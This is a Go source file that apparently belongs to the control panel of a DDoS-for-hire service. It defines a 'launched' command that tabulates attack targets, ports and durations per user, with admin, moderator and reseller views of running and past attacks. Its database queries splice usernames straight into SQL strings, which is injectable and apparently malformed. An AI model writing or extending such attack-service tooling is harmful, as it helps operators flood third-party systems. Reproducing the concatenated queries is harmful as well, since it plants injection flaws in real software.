package commands

import (
	"Nosviak/core/database"
	"Nosviak/core/masters/sessions"
	"Nosviak/core/masters/users/pager"
	"Nosviak/core/models/util"
	"Nosviak/core/models/views"
	"strconv"
	"time"

	"github.com/alexeyco/simpletable"
)

func init() {

	NewCommand(&Command{
		Name:           "launched",
		Desciption:     "basic management command for attacks",
		ZeroArguments: func(session *sessions.Session, args []string) error {
			//the zero arguments displays your launched attacks
			//this will produce a table which you can use to view all your attacks

			//querys the database for all attacks the user launched
			//this will create a table for all attacks launched by a user
			attacks, err := database.Container.QueryAttacks("SELECT `Target`, `Port`, `Duration`, `Created`, `Finish`, `Username` FROM `attacks` WHERE `Username` = "+session.User.Username)
			//err handles the statement
			//makes sure the statement executed correctly
			if err != nil{
				return views.NewDTX("commands-launched-invalidUser.dtx", session.Write).RegisterStructure("trying", *session.User).Template(session, session.Channel)
			}
			
			table := simpletable.New()

			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "#"},
					{Align: simpletable.AlignCenter, Text: "date"},
					{Align: simpletable.AlignCenter, Text: "target"},
					{Align: simpletable.AlignCenter, Text: "port"},
					{Align: simpletable.AlignCenter, Text: "since"},
				},
			}

			//ranges through all attack requests made
			//this will display every attack request made
			for pos, attack := range attacks {
				//creates a new cell row per attack request
				r := []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: strconv.Itoa(pos)},
					{Align: simpletable.AlignCenter, Text: time.Unix(attack.Created, 0).Format("2/01/2006 15:04:05")},
					{Align: simpletable.AlignCenter, Text: attack.Target},
					{Align: simpletable.AlignCenter, Text: strconv.Itoa(attack.Port)},
					{Align: simpletable.AlignCenter, Text: util.ResolveTimeStamp(time.Unix(attack.Finish, 0), false)},
				}
	
				//appends the cellRows into the main body cell array
				table.Body.Cells = append(table.Body.Cells, r)
			}
			
			//renders inside the pager correctly
			return pager.NewPager("launched", table, session).ExecutePager()
		},

		SubFeatures: []SubFeature{
			{
				Name: "running",
				Desciption: "view ongoing attacks for a user",
				MinPermissions: []string{"admin", "moderator", "reseller"},
				ExecutionBody: func(session *sessions.Session, args []string) error {

					//checks that the request contains a user
					//we will view all the attacks that user has launched
					if len(args) < 3 {
						//returns the splash with the error if one happened
						return views.NewDTX("commands-launched-running-missingUser.dtx", session.Write).Template(session, session.Channel)
					}

					//gets the last item from the array as the user argument
					//this will search for the user inside the database to check it exists
					user, err := database.Container.GetUser(args[len(args)-1])
					
					//err handles the search statement
					//this will properly error handle the search statement
					if err != nil || user == nil {
						//returns the splash with the error if one happened
						return views.NewDTX("commands-launched-running-invalidUser.dtx", session.Write).RegisterVariable("username", args[len(args)-1]).Template(session, session.Channel)
					}

					//querys the database for all attacks the user launched
					//this will create a table for all attacks launched by a user
					attacks, err := database.Container.QueryAttacks("SELECT `Target`, `Port`, `Duration`, `Created`, `Finish`, `Username` FROM `attacks` WHERE `Finish` > "+strconv.Itoa(int(time.Now().Unix()))+" AND `Username` = "+user.Username)

					//err handles the statement
					//makes sure the statement executed correctly
					if err != nil{
						return views.NewDTX("commands-launched-running-invalidUser.dtx", session.Write).RegisterVariable("username", args[len(args)-1]).Template(session, session.Channel)
					}

					table := simpletable.New()

					table.Header = &simpletable.Header{
						Cells: []*simpletable.Cell{
							{Align: simpletable.AlignCenter, Text: "#"},
							{Align: simpletable.AlignCenter, Text: "date"},
							{Align: simpletable.AlignCenter, Text: "target"},
							{Align: simpletable.AlignCenter, Text: "port"},
							{Align: simpletable.AlignCenter, Text: "since"},
						},
					}
		
					//ranges through all attack requests made
					//this will display every attack request made
					for pos, attack := range attacks {
						//creates a new cell row per attack request
						r := []*simpletable.Cell{
							{Align: simpletable.AlignCenter, Text: strconv.Itoa(pos)},
							{Align: simpletable.AlignCenter, Text: time.Unix(attack.Created, 0).Format("2/01/2006 15:04:05")},
							{Align: simpletable.AlignCenter, Text: attack.Target},
							{Align: simpletable.AlignCenter, Text: strconv.Itoa(attack.Port)},
							{Align: simpletable.AlignCenter, Text: util.ResolveTimeStamp(time.Unix(attack.Finish, 0), false)},
						}
			
						//appends the cellRows into the main body cell array
						table.Body.Cells = append(table.Body.Cells, r)
					}

					//renders inside the pager correctly
					return pager.NewPager("launched", table, session).ExecutePager()
				},
			},
			{
				Name: "view",
				Desciption: "display attacks launched by a user",
				MinPermissions: []string{"admin", "moderator"},
				ExecutionBody: func(session *sessions.Session, args []string) error {

					//checks that the request contains a user
					//we will view all the attacks that user has launched
					if len(args) < 3 {
						//returns the splash with the error if one happened
						return views.NewDTX("commands-launched-view-missingUser.dtx", session.Write).Template(session, session.Channel)
					}

					//gets the last item from the array as the user argument
					//this will search for the user inside the database to check it exists
					user, err := database.Container.GetUser(args[len(args)-1])
					
					//err handles the search statement
					//this will properly error handle the search statement
					if err != nil || user == nil {
						//returns the splash with the error if one happened
						return views.NewDTX("commands-launched-view-invalidUser.dtx", session.Write).RegisterVariable("username", args[len(args)-1]).Template(session, session.Channel)
					}

					//querys the database for all attacks the user launched
					//this will create a table for all attacks launched by a user
					attacks, err := database.Container.QueryAttacks("SELECT `Target`, `Port`, `Duration`, `Created`, `Finish`, `Username` FROM `attacks` WHERE `Username` = "+user.Username)

					//err handles the statement
					//makes sure the statement executed correctly
					if err != nil{
						return views.NewDTX("commands-launched-view-invalidUser.dtx", session.Write).RegisterVariable("username", args[len(args)-1]).Template(session, session.Channel)
					}

					table := simpletable.New()

					table.Header = &simpletable.Header{
						Cells: []*simpletable.Cell{
							{Align: simpletable.AlignCenter, Text: "#"},
							{Align: simpletable.AlignCenter, Text: "date"},
							{Align: simpletable.AlignCenter, Text: "target"},
							{Align: simpletable.AlignCenter, Text: "port"},
							{Align: simpletable.AlignCenter, Text: "since"},
						},
					}
		
					//ranges through all attack requests made
					//this will display every attack request made
					for pos, attack := range attacks {
						//creates a new cell row per attack request
						r := []*simpletable.Cell{
							{Align: simpletable.AlignCenter, Text: strconv.Itoa(pos)},
							{Align: simpletable.AlignCenter, Text: time.Unix(attack.Created, 0).Format("2/01/2006 15:04:05")},
							{Align: simpletable.AlignCenter, Text: attack.Target},
							{Align: simpletable.AlignCenter, Text: strconv.Itoa(attack.Port)},
							{Align: simpletable.AlignCenter, Text: util.ResolveTimeStamp(time.Unix(attack.Finish, 0), false)},
						}
			
						//appends the cellRows into the main body cell array
						table.Body.Cells = append(table.Body.Cells, r)
					}

					//renders inside the pager correctly
					return pager.NewPager("launched", table, session).ExecutePager()
				},
			},
		},
	})
}